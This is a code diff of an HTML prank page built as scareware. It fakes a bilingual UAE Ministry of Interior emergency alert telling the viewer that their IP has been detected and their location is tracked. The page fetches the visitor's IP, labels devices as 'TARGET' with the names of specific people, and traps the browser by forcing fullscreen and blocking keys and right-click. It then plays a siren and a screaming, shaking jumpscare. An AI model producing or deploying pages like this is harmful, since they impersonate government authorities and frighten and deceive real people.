@@ -3,60 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Security Breach!</title>
+    <title>Emergency Alert</title>
     <style>
-        :root { --uae-red: #ff0000; --stark-cyan: #00d2ff; }
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: 'Segoe UI', Tahoma, sans-serif; cursor: none; }
+        :root { --uae-red: #d32f2f; --stark-cyan: #00d2ff; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; cursor: none; }
         
-        /* UAE Amber Alert Overlay */
+        /* SYSTEM MODAL */
         #amber-alert {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(255, 0, 0, 0.9); color: white; z-index: 20000;
-            display: flex; flex-direction: column; justify-content: center; align-items: center;
-            text-align: center; padding: 20px; box-sizing: border-box; visibility: hidden;
+            background: rgba(0, 0, 0, 0.85); z-index: 20000;
+            justify-content: center; align-items: center;
         }
-        .alert-box { border: 10px solid white; padding: 40px; background: #000; max-width: 600px; }
-        
-        /* Jumpscare Container */
-        #scare-space { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 15000; background: #000; }
+        .system-modal {
+            background: #fdfdfd; width: 85%; max-width: 320px; border-radius: 12px;
+            overflow: hidden; box-shadow: 0 0 50px rgba(0,0,0,1); text-align: center;
+            animation: vibe 0.1s infinite;
+        }
+        .modal-header { background: var(--uae-red); color: white; padding: 10px; font-weight: bold; font-size: 16px; border-bottom: 2px solid white; }
+        .modal-body { padding: 18px; color: #111; font-size: 13px; line-height: 1.5; font-weight: 500; }
+        .modal-btn { border-top: 1px solid #ddd; padding: 12px; color: #007aff; font-weight: 600; font-size: 17px; background: #eee; }
+
+        @keyframes vibe { 0% { transform: scale(1); } 50% { transform: scale(1.01); } 100% { transform: scale(1); } }
+
+        /* JUMPSCARE */
+        #scare-space { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 25000; background: #000; }
         #scare-img { width: 100%; height: 100%; object-fit: cover; }
 
-        /* HUD & Loading */
+        /* HUD */
         #loading-zone { height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; color: var(--stark-cyan); font-family: 'Share Tech Mono', monospace; }
-        .terminal { border-left: 3px solid var(--stark-cyan); padding-left: 20px; text-align: left; }
-        #bar { width: 0%; height: 2px; background: var(--stark-cyan); transition: width 2s linear; margin: 15px 0; }
-        
-        #bsod { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0078d7; color: white; padding: 10%; z-index: 30000; }
-        .flash-red { background: var(--uae-red) !important; }
+        #bar { width: 0%; height: 2px; background: var(--stark-cyan); transition: width 2s linear; margin-top: 10px; }
     </style>
 </head>
 <body oncontextmenu="return false;">
 
-    <div id="bsod"><h1>:(</h1><p>Your PC ran into a problem. Stop Code: STARK_BYPASS_DETECTED</p></div>
-
     <div id="amber-alert">
-        <div class="alert-box">
-            <h1 style="font-size: 3rem; margin-bottom: 0;">EMERGENCY ALERT</h1>
-            <h2 style="font-size: 2rem; margin-top: 0;">تنبيه حالة طوارئ</h2>
-            <hr>
-            <p style="font-size: 1.5rem;"><b>LOCATION: UNITED ARAB EMIRATES</b></p>
-            <p style="font-size: 1.2rem;">A critical system breach has been detected in your vicinity. Local authorities have been notified of your IP address.</p>
-            <p style="font-size: 1.2rem; direction: rtl;">تم اكتشاف اختراق أمني حرج في منطقتك. تم إخطار السلطات المحلية بعنوان IP الخاص بك.</p>
+        <div class="system-modal">
+            <div class="modal-header">⚠️ Emergency Alert / تنبيه ⚠️</div>
+            <div class="modal-body">
+                <b>GOVERNMENT OF UAE: MOI</b><br><br>
+                Unauthorized access detected from this IP. Location tracking is active. Stay where you are.<br><br>
+                تم اكتشاف وصول غير مصرح به. تتبع الموقع نشط حاليا. ابق في مكانك.
+            </div>
+            <div class="modal-btn">OK</div>
         </div>
     </div>
 
     <div id="scare-space">
-        <img id="scare-img" src="https://files.catbox.moe/6v3r8g.jpg" alt="scare"> 
-        <audio id="siren" loop src="https://www.soundboard.com/handler/DownLoadTrack.ashx?cliptitle=Emergency+Alert+System+EAS+Alarm&filename=24/244331-5975003c-8272-468a-9290-7984f4797063.mp3"></audio>
+        <img id="scare-img" src="https://images2.imgbox.com/00/f8/pS9F9TTo_o.jpg" onerror="this.src='https://i.postimg.cc/85z1X2yv/scare.jpg'">
+        <audio id="siren" loop src="https://files.catbox.moe/k20e9m.mp3"></audio>
         <audio id="scream" src="https://files.catbox.moe/5z5z6n.mp3"></audio>
     </div>
 
     <div id="loading-zone" onclick="ignite()">
-        <div class="terminal">
-            <h2 id="tag">SYSTEM_BOOT_v11</h2>
-            <div id="info">> LOCATING...</div>
+        <div style="border-left: 2px solid var(--stark-cyan); padding-left: 15px;">
+            <h2 id="tag">UPLINK_INITIALIZED</h2>
+            <div id="info">> SYNCING_NODES...</div>
             <div id="bar"></div>
-            <p id="status">[ CLICK TO SYNC TO UAE_NODES ]</p>
+            <p id="status">[ OVERRIDE SECURITY ]</p>
         </div>
     </div>
 
@@ -67,26 +70,24 @@
         const scare = document.getElementById('scare-space');
 
         async function init() {
-            let ip = "0.0.0.0", isp = "Secure_Link";
-            try { const res = await fetch('https://ipapi.co/json/'); const data = await res.json(); ip = data.ip; isp = data.org; } catch(e){}
+            let ip = "0.0.0.0";
+            try { const res = await fetch('https://ipapi.co/json/'); const data = await res.json(); ip = data.ip; } catch(e){}
 
             const ua = navigator.userAgent;
             const isTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
             
-            if (!isTouch) {
-                document.getElementById('tag').innerText = "LAPTOP_EXPOSED: JAHAN";
-                document.getElementById('info').innerHTML = `> SSID: JAHAN_5G<br>> IP: ${ip}<br>> LOC: UAE_NODE_01`;
-            } else if (/iPad|Tablet|Tab|SM-T|SM-P/i.test(ua)) {
-                document.getElementById('tag').innerText = "TABLET_EXPOSED: CID-2";
-                document.getElementById('info').innerHTML = `> SSID: CID-2_PRIVATE<br>> IP: ${ip}<br>> LOC: UAE_NODE_07`;
-            } else {
-                document.getElementById('tag').innerText = "SYSTEM_BREACH_ACTIVE";
-                document.getElementById('info').innerHTML = `> RES: ${screen.width}x${screen.height}<br>> IP: ${ip}`;
-            }
+            let name = "ABDULLAH";
+            if (/iPad/.test(ua)) name = "AMNA";
+            else if (/Samsung|SM-T|SM-P/.test(ua)) name = "RABIA";
+            else if (/Redmi|Android/.test(ua)) name = "AFAAN";
+            else if (!isTouch) name = "ABDULLAH";
+
+            document.getElementById('tag').innerText = `TARGET: ${name}`;
+            document.getElementById('info').innerHTML = `> IP: ${ip}<br>> STATUS: EXPOSED`;
         }
         init();
 
-        function lock() {
+        function forceLock() {
             const el = document.documentElement;
             if (el.requestFullscreen) el.requestFullscreen();
             else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
@@ -94,52 +95,35 @@
         }
 
         function ignite() {
-            lock();
+            forceLock();
             document.getElementById('bar').style.width = "100%";
-            document.getElementById('status').innerText = "CONNECTING_TO_MOI_SERVER...";
-
+            
             setTimeout(() => {
                 document.getElementById('loading-zone').style.display = 'none';
-                
-                // 1. Show UAE Amber Alert + Play Siren
-                amber.style.visibility = 'visible';
                 amber.style.display = 'flex';
                 siren.volume = 1.0;
                 siren.play();
 
-                // 2. Start Flash & Fullscreen Lock
                 setInterval(() => {
-                    if(!document.fullscreenElement && !document.webkitFullscreenElement) lock();
-                    siren.volume = 1.0;
-                    document.body.classList.toggle('flash-red');
+                    if(!document.fullscreenElement && !document.webkitFullscreenElement) forceLock();
                 }, 50);
 
-                // 3. Trigger Jumpscare after 3 seconds of Alert
                 setTimeout(() => {
                     amber.style.display = 'none';
                     scare.style.display = 'block';
                     siren.pause();
                     scream.volume = 1.0;
                     scream.play();
-                    
-                    // Shake effect
-                    setInterval(() => {
-                        document.getElementById('scare-img').style.transform = `translate(${Math.random()*10-5}px, ${Math.random()*10-5}px)`;
-                    }, 10);
-                }, 4000);
 
-                document.addEventListener('click', lock);
-            }, 1500);
+                    // Violent Shake
+                    setInterval(() => {
+                        document.getElementById('scare-img').style.transform = `translate(${Math.random()*20-10}px, ${Math.random()*20-10}px)`;
+                    }, 20);
+                }, 3500);
+            }, 1000);
         }
 
-        // BSOD on Keypress
-        document.addEventListener('keydown', (e) => {
-            e.preventDefault();
-            document.getElementById('bsod').style.display = 'block';
-            setTimeout(() => { document.getElementById('bsod').style.display = 'none'; lock(); }, 1500);
-        });
-
-        window.onbeforeunload = () => "CRITICAL_ALERT";
+        document.addEventListener('keydown', (e) => e.preventDefault());
     </script>
 </body>
 </html>
